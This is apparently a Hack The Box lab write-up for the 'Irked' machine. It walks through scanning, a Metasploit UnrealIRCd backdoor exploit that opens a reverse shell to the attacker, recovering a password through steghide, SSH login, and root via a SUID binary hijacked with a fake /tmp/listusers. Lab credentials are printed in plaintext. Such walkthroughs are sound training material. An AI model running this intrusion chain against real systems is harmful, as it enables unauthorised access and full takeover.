## Irked


| Name   |      Description |  
|----------|:------------- |
| Machine IP |  10.10.10.117 |
|Difficulty |    Medium   |

## Scanning

### Nmap scanning

```bash
$ nmap -sC -sV  -oN nmap/irked  10.10.10.117
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 07:25 EDT
Nmap scan report for 10.10.10.117
Host is up (0.096s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40569/udp   status
|   100024  1          42253/tcp   status
|   100024  1          43534/tcp6  status
|_  100024  1          49792/udp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.90 seconds
```

__All ports scan__

```bash
# nmap -p- -sC -sV 10.10.10.117
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-17 14:02 EST
Nmap scan report for 10.10.10.117
Host is up (0.019s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33436/udp  status
|_  100024  1          50397/tcp  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
50397/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kerne
```


## Enumeration

- Webapage

![homepage](images/homepage.PNG)

__UnrealIRCd exploitation__

- found an exploit in `searchsploit`

```bash
$ searchsploit UnrealIRCd              
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow     | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute              | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                   | windows/dos/27407.pl
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```



## Exploitation 

- Running metasploit

```bash
msf6 > search UnrealIRCd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor

msf6 > 
```

```bash
msf6 > use 0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 10.10.10.117
rhosts => 10.10.10.117
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lport 8067
lport => 8067
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost tun0
lhost => tun0
```
```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP handler on 10.10.14.12:8067 
[*] 10.10.10.117:8067 - Connected to 10.10.10.117:8067...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:8067 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.14.12:8067 -> 10.10.10.117:56302) at 2021-09-16 07:46:14 -0400

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```


- Running `linpeas`, bothing interesing found, but `.backup` folder is found in users'documents 

```bash
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

- finding `irked.jpg` file

```bash
ircd@irked:/home/djmardov/Documents$ find / -name irked.jpg 2>/dev/null
find / -name irked.jpg 2>/dev/null
/var/www/html/irked.jpg

```

- transfer the file into host machine. it is in `http://10.10.10.117/irked.jpg`


- using `steghide` (use passphrase `UPupDOWNdownLRlrBAbaSSss`)

```bash
 steghide extract -sf irked.jpg                  
 Enter passphrase: 
wrote extracted data to "pass.txt".
```

```bash
$ cat pass.txt                              
Kab6h+m+bbp2J:HG
```

- Now ssh to user `djmardov`

```bash
$ ssh djmardov@10.10.10.117                        130 ⨯
The authenticity of host '10.10.10.117 (10.10.10.117)' can't be established.
ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.117' (ECDSA) to the list of known hosts.

Kab6h+m+bbp2J:HG
djmardov@10.10.10.117's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
djmardov@irked:~$ 
```


## Privilege escalation


- SUID binary found `/usr/bin/viewuser`

```bash
djmardov@irked:~$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```


- The binary is seems to execute a file in `tmp/listusers` , we can copy `/bin/sh` to `/tmp` as `listusers` and execute

```bash
djmardov@irked:~$ ls -la /usr/bin/viewuser
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-09-16 07:22 (:0)
djmardov pts/2        2021-09-16 08:03 (10.10.14.12)
sh: 1: /tmp/listusers: not found
```

```bash
djmardov@irked:/tmp$ cp /bin/sh /tmp/listusers
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-09-16 07:22 (:0)
djmardov pts/2        2021-09-16 08:03 (10.10.14.12)
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```